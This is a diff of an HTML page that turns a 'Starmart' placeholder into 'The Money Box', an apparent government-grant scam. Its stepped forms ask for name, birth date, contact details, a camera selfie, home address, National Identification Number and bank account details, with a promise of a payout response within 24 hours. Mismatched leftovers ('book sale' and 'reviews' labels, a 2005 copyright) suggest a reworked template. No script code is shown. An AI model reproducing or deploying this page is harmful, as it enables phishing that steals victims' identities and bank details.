@@ -8,22 +8,503 @@
   <meta property="og:image" content="preview.png">
   <meta property="og:discription" content="Starmart">
   <style>
-    
+  body {
+  font-family: 'Arial', sans-serif;
+  margin: 0;
+  padding: 0;
+  line-height: 1.6;
+}
+
+/* Top Ad Styles */
+.top-ad {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  background-color: #008000;
+  color: #fff;
+  padding: 10px 20px;
+  z-index: 1000;
+  border-bottom: 2px solid #fff;
+  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+  overflow: hidden; /* Ensures content does not overflow during animation */
+}
+
+.ad-content {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  top: -100px; /* Start hidden above the viewport */
+  left: 0px;
+  position: relative;
+}
+
+.ad-content p {
+  margin: 0;
+  font-size: 1rem;
+}
+
+.ad-content a {
+  color: white;
+  font-size: 1rem;
+}
+
+.close-ad {
+  background: transparent;
+  border: none;
+  color: #fff;
+  font-size: 1.5rem;
+  cursor: pointer;
+  padding: 0 30px;
+}
+
+.close-ad:hover {
+  color: #ddd;
+}
+
+/* Hidden Class for Animation */
+.hidden-content {
+  top: -100px; /* Position above the viewport */
+} 
+	  
+.hidden {
+	display: none;
+}
+	  
+.visible-content  {
+  top: 0; /* Position at the top of the viewport */
+}
+
+a {
+  color: #008000;
+  text-decoration: none;
+  text-align: center;
+}
+
+a h2{
+  background-color: blanchedalmond;
+  max-width: 300px;
+  margin: auto;
+  border-radius: 5px;
+  box-shadow: 0px 2px 4px #008000;
+  cursor: pointer;
+  line-height: 2rem;
+  padding: 5px;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* Header */
+.header {
+  text-align: center;
+  padding: 2rem;
+  background-image: url('Moneybox.jpeg'); 
+  background-position: bottom; 
+  background-size: cover; 
+  filter: blur(3px); 
+  border-bottom: 2px solid #008000;
+  border-top: 10px solid black;
+  max-height: 80px;
+}
+
+.header h1 {
+  font-size: 3rem;
+  color: #ff6f61;
+  margin: 0;
+  filter: drop-shadow(2px 4px 6px black);
+  opacity: 0;
+}
+
+.header p {
+  font-size: 1.2rem;
+  margin: 0.5rem 0;
+  color: #ff6f61;
+  opacity: 0;
+}
+
+/* Content */
+.content {
+  padding: 1.2rem;
+}
+
+section {
+  margin-bottom: 2rem;
+}
+
+h4 {
+  color: #008000;
+  margin-bottom: 0.5rem;
+  font-size: 20px;
+}
+
+p, ul, li {
+  font-size: 1rem;
+  margin: 0.5rem 0;
+}
+
+ul {
+  list-style-type: disc;
+  padding-left: 1rem;
+}
+
+	  .form-container {
+		  display: none;
+            margin: 20px 0px;
+            padding: 5px 15px 40px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.15);
+            border-radius: 5px;
+		  text-align: center;
+        }
+        .active {
+            display: block;
+        }
+	  .formHead {
+		  text-align: center;
+		  width: 100%;
+		  font-size: 24px;
+	  }
+	  .input {
+		  margin: 15px auto;
+	  }
+	  .input label {
+		  display: block;
+		  padding-left: 10px;
+		  font-size: 14px;
+		  text-align: left;
+	  }
+	  .select {
+		  position: relative;
+	  }
+	  .datalistInput { 
+		  cursor: pointer;
+	  }
+	  .arrow {
+		  position: absolute;
+		  top: 50%;
+		  right: 10px;
+		  transform: translateY(-50%);
+		  pointer-events: none;
+		  color: #666;
+		  transition: transform 0.2s ease;
+	  }
+	  .options {
+		  position: absolute;
+		  top: 100%;
+		  left: 0;
+		  right: 0;
+		  background: white;
+		  border: 1px solid #ccc;
+		  border-top: none;
+		  border-radius: 0 0 4px 4px;
+		  max-height: 150px;
+		  overflow-y: auto;
+		  list-style: none;
+		  padding: 0;
+		  margin: 0;
+		  display: none;  
+		  z-index: 1000;
+	  }
+	  .options li {
+		  padding: 8px 10px;
+		  cursor: pointer;
+	  }
+	  .options li:hover {
+		  background-color: #f0f0f0;
+	  }
+	 .featured button {
+            padding: 10px 20px;
+            background: #008000;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+		    width: 100%;
+            margin: auto;
+            font-size: 16px;
+        }
+	  button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+input, select {
+	background-color: transparent;
+	color: #000;
+    font-size: 16px;
+    border: 1px solid #000;
+	width: 100%;
+	box-sizing: border-box;
+	padding: 12px;
+	outline: none;
+  }
+	  
+input[type="file"] {
+	display: none;
+  }
+	  
+.selfie label{
+	background-color: #000;
+	color: #fff;
+	margin-top: 35px;
+	padding: 5px;
+	text-align: center;
+}
+	  
+#firstForm select {
+	font-size: 16px;
+	padding: 8px;
+}
+	  
+
+.moneybox{
+width: 400px;
+height: auto;
+max-width: 100%;
+}
+
+
+/* Featured Books */
+.book-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 1.5rem;
+}
+
+.book {
+  background-color: #222;
+  padding: 1rem;
+  border-radius: 8px;
+}
+
+.book h3 {
+  margin-top: 0;
+  color: #ff6f61;
+}
+
+/* Reviews */
+.reviews {
+	padding-top: 30px;
+}
+	  
+blockquote {
+  font-style: italic;
+  padding-left: 1.2rem;
+  border-left: 4px solid #008000;
+  margin: 5px 0;
+}
+
+/* Footer */
+.footer {
+  text-align: center;
+  padding: 1rem;
+  color: #fff;
+  background-color: #ccc;
+  border-top: 2px solid #008000;
+}
+
+.footer p {
+  font-size: 0.9rem;
+  margin: 0.5rem 0;
+}
+
   </style>
 </head>
-  <body>
-    <div class="top">
-      <div class="logo">
-        <h4>Starmart</h4>
-      </div>
-      <div class="button">
-        <button>Redeem Token</button>
-      </div>
+<body>
+<!-- Top Page Advertisement -->
+  <div id="top-ad" class="top-ad">
+    <div id="ad-content" class="ad-content hidden-content">
+      <p>🎉 Stock Market: With the best Nigerian Stock broker. <strong><a href="https://investbamboo.com">Try Bamboo</a></strong>. 🎉</p>
+      <button id="close-ad" class="close-ad">✖</button>
     </div>
-    <div class="body">
+  </div>
 
-    </div>
-  </body>
+  <!-- Header Section -->
+  <header class="header">
+    <h1>The Money Box</h1>
+    <p>A Book Sale Event Like No Other</p>
+  </header>
+
+  <!-- Main Content -->
+  <main class="content">
+    <!-- About the Book Sale -->
+    <section class="about" id="about">
+      <h2>NGN Gov-Grant</h2>
+      <p>Government Grants, General & Foundation Grants, Industry-Specific Grants, Minority/Women-Owned, Student/Business Grants.</p>
+    </section>
+
+    <!-- Form Part -->
+    <section class="featured" id="featured">
+		
+		<!-- Form one -->
+		<div id="form1" class="form-container active">
+     <form id="firstForm" enctype=“multipart/form-data">
+
+		 <h3 class="formHead">Personal Details</h3>
+		 
+		 <div class="input">
+			 <label for="name">Full Name</label>
+			 <input type="text" id="name" name="name" placeholder="Your Full Name" autocomplete="name" required autofocus>
+		 </div>
+
+		 <div class="input">
+			 <label for="gender">Gender</label>
+			 <div class="select">
+				 <input type="text" class="datalistInput" list="genders" id="gender" name="gender" placeholder="Please select one" readonly>
+				 <div class="arrow">▼</div>
+			 <ul class="options">
+				 <li data-value="Male">Male</li>
+				 <li data-value="Female">Female</li>
+				 <li data-value="Rather not say">I'd Rather not say</li>
+			 </ul>
+			 </div>
+		 </div>
+
+		 <div class="input">
+			 <label for="dob">Date Of Birth</label>
+			 <input type="date" style="width: 90%;" id="dob" name="dob" placeholder="Your Date of Birth" required>
+		 </div>
+
+		 <div class="input">
+			 <label for="email">Email</label>
+			 <input type="email" id="email" name="email" autocomplete="email" placeholder="Your Email Address" autocomplete="email" required>
+		 </div>
+		 
+		 <div class="input">
+			 <label for="employ">Employment Status</label>
+			 <div class="select">
+				 <input type="text" class="datalistInput" list="employs" id="employ" name="employ" placeholder="Please select one"  readonly>
+				 <div class="arrow">▼</div>
+			 <ul class="options">
+				 <li data-value="Self-Employed">Self-Employed</li>
+				 <li data-value="Student">Student</li>
+				 <li data-value="Employed">Employed</li>
+				 <li data-value="Unemployed">Unemployed</li>
+			 </ul>
+			 </div>
+		 </div>
+		
+		 <div class="input">
+			 <label for="phone">Phone</label>
+			 <input type="tel" id="phone" name="phone" placeholder="Your Phone Number" autocomplete="phone" required>
+		 </div>
+
+		 <div class="input">
+			 <label for="marital">Marital Status</label>
+			 <div class="select">
+				 <input type="text" class="datalistInput" list="maritals" id="marital" name="marital" placeholder="Please select one"  readonly>
+				 <div class="arrow">▼</div>
+			 <ul class="options">
+				 <li data-value="single">Single</li>
+				 <li data-value="married">Married</li>
+				 <li data-value="divorced">Divorced</li>
+			 </ul>
+			 </div>
+		 </div>
+
+		 <div class="input selfie">
+			 <label for="selfie" id="selfieLabel">Take A Selfie</label>
+			 <input type="file" id="selfie" name="selfie" accept="image/*" capture="user">
+			 <small>Use camera to take a selfie. Max size: 10MB</small>
+		 </div>
+		 
+		 <div id="response"></div>
+		 
+		 <button type="submit" id="submitBtn1">SUMBIT</button>
+	 </form>
+		</div>
+
+		<!-- Form two -->
+		<div id="form2" class="form-container">
+     <form id="secondForm" method="post">
+
+		 <h3 class="formHead">Address Verification</h3>
+		 
+		 <div class="input">
+			 <label for="city">City</label>
+			 <input type="text" id="city" name="city" placeholder="Input City" autocomplete="city" required>
+		 </div>
+		 
+		 <div class="input">
+			 <label for="state">State</label>
+			 <input type="text" id="state" name="state" placeholder="Input State" autocomplete="state" required>
+		 </div>
+		 
+		 <div class="input">
+			 <label for="address">Residential Address</label>
+			 <input type="text" id="address" name="address" placeholder="Your residentail Adress" autocomplete="address" required>
+		 </div>
+		 
+		 <div class="input">
+			 <label for="lga">Local Government Area</label>
+			 <input type="text" id="lga" name="lga" placeholder="Your Local Government Area" required>
+		 </div>
+		 
+		 <div class="input">
+			 <label for="nin">National Identification Number(NIN)</label>
+			 <input type="text" id="nin" name="nin" placeholder="Your NIN" required>
+		 </div>
+		 
+		 <button type="submit" id="submitBtn2">SUMBIT</button>
+	 </form>
+		</div>
+
+		<!-- Form three -->
+		<div id="form3" class="form-container">
+     <form id="thirdForm" method="post">
+
+		 <h3 class="formHead">Bank Details</h3>
+		 
+		 <div class="input">
+			 <label for="bankName">Bank Name</label>
+			 <input type="text" id="bankName" name="bankName" placeholder="Your Bank Name" required>
+		 </div>
+		 
+		 <div class="input">
+			 <label for="accountNumber">Your Account Number</label>
+			 <input type="tel" id="accountNumber" name="accountNumber" placeholder="Your Account Number" required>
+		 </div>
+		 
+		 <div class="input">
+			 <label for="accountName">Your Account Name</label>
+			 <input type="text" id="accountName" name="accountName" placeholder="Your Account Name" required>
+		 </div>
+		 
+		 <button type="submit" id="submitBtn3">COMPLETE</button>
+	 </form>
+		</div>
+
+		<!-- Form Completed -->
+		<div id="completed" class="form-container">
+			<h5 style="font-size: 16px;">Form has been successfully submited!!✅ <br><br>We will contact you with a response within 24 hours...</h5>
+		</div>
+    </section>
+
+    <!-- Customer Reviews -->
+    <section class="reviews" id="reviews">
+      <h4>Administration</h4>
+      <blockquote>Roadmap includes a tailored list of high-impact public and private sector grants mapped to eligible applicants</blockquote>
+      <blockquote>We manage disbursement end-to-end: kickoff, procurement, subrecipient oversight, documentation, requests, monitoring, and payout</blockquote>
+	</section>
+	  
+    <!-- Contact and Inquiries -->
+    <section class="contact" id="contact">
+      <h4>Contact and Inquiries</h4>
+      <p>If you have any questions about the payout or need assistance, please reach out to us:</p>
+      <ul>
+        <li>Email: <a href="mailto:info@govgrant.com">info@govgrant.com</a></li>
+        <li>Phone: (807) 420‑1498</li>
+        <li>Contact us for any for updates!</li>
+      </ul>
+    </section>
+  </main>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <p>&copy; 2005 GovGrant. All rights reserved.</p>
+  </footer>
+</body>
 </html>
   
   
